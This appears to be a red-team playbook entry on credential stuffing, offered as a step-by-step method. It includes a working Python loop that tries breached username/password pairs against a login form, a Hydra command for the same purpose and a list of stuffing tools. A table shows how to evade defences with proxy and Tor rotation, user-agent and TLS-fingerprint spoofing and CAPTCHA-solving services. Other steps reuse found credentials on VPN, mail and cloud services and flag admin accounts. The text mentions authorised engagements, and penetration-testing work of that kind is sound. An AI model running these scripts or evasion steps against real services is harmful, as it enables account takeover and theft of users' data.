# Password Attacks — Credential Stuffing

## When this applies

- The target service does not enforce MFA AND does not detect bulk login attempts.
- You have access to credential breach databases (HIBP, public dumps).
- Goal: try leaked username/password pairs from one breach against a different service (assumes password reuse).

## Technique

Unlike password spraying (single password × many users), credential stuffing tries pairs from public breaches against a target service. ~30% of users reuse passwords across services, so even a small breach corpus often yields working credentials.

## Steps

### 1. Source credential pairs

| Source | Notes |
|---|---|
| **Have I Been Pwned** | Reverse-search exposed breaches; bulk export requires API key |
| **Public dumps** | Pastebin, breach forums (legal risk; only use authorized engagement-relevant data) |
| **Internal red-team baseline** | Curated lists from prior engagements (within ROE) |
| **Combo lists** | Aggregated `<user>:<password>` lines |

### 2. Format for the target service

Most credential stuffers expect `<username>:<password>` lines:

```
user1@domain.com:Password1!
user2@domain.com:Welcome2024
```

### 3. Validate against the target

```python
import requests
session = requests.Session()
for line in open('combos.txt'):
    user, pw = line.strip().split(':', 1)
    r = session.post('https://target.com/login',
                     data={'email':user,'password':pw},
                     allow_redirects=False)
    if r.status_code == 302 or 'logged in' in r.text:
        print(f'[+] {user}:{pw}')
        # Don't break — collect all hits
```

### 4. Use credential-stuffing tools

- **Sentry MBA** — GUI-based stuffer (legal status varies).
- **OpenBullet** — open-source automation framework, "configs" per target.
- **SNIPR** — paid stuffer.
- **THC Hydra** with `-C combo.txt` — honest open-source.

```bash
hydra -C combos.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```

### 5. Bypass anti-stuffing controls

| Defense | Bypass |
|---|---|
| IP rate limiting | Rotate via proxies / Tor / proxychains |
| User-Agent fingerprinting | Randomize UA per request |
| TLS fingerprinting (JA3) | Use mitmproxy or curl-impersonate |
| CAPTCHA after N failures | Slow down; CAPTCHA solvers (2captcha API) |
| Device fingerprinting | New cookies / browsers per attempt |
| Velocity checks | Spread over time |

### 6. Check for password reuse across services

Once you find valid credentials on Service A, try on Service B (mail, VPN, cloud):

```python
for service in ['vpn.target.com', 'mail.target.com', 'cloud.target.com']:
    test_login(service, user, pw)
```

### 7. Identify high-value accounts in the corpus

After authenticating, check role/permissions:

```python
r = session.get('/profile')
if 'admin' in r.text.lower():
    print(f"[!] HIGH VALUE: {user} is admin")
```

### 8. Fingerprint defensively-tuned targets

Some targets implement "shadow lockout" — the login form keeps returning "Invalid credentials" even for valid combos when credential stuffing is detected. Test by:
- Sending one known-valid combo (yours) at the start, middle, and end of the run.
- If yours starts failing too, the target is shadow-locking.

## Verifying success

- Tool returns `[+]` for combo + service.
- Manual login with the combo succeeds in a clean browser.
- The account has expected roles/permissions.

## Common pitfalls

- Many large services (Google, Microsoft, etc.) have sophisticated stuffing detection — heavy traffic gets shadow-banned.
- Combo lists are often outdated; password rotation cuts hit rate sharply.
- Legal: using data from breaches you didn't lawfully receive is risky. Stick to engagement-authorized lists.
- Many services now require MFA — even valid creds fail without OTP.
- Shadow lockout / silent rate limiting: tests appear to succeed but don't.

## Tools

- OpenBullet (automation framework).
- Hydra (`-C combos.txt`).
- Custom Python with persistent session.
- Have I Been Pwned API for "is this email in any breach?".
- Tor / Proxychains for IP rotation.

## References

- MITRE ATT&CK T1110.004 (Credential Stuffing).
- CWE-262 (Not Using Password Aging).
- OWASP Credential Stuffing Prevention Cheat Sheet.
- HIBP API: https://haveibeenpwned.com/API/v3
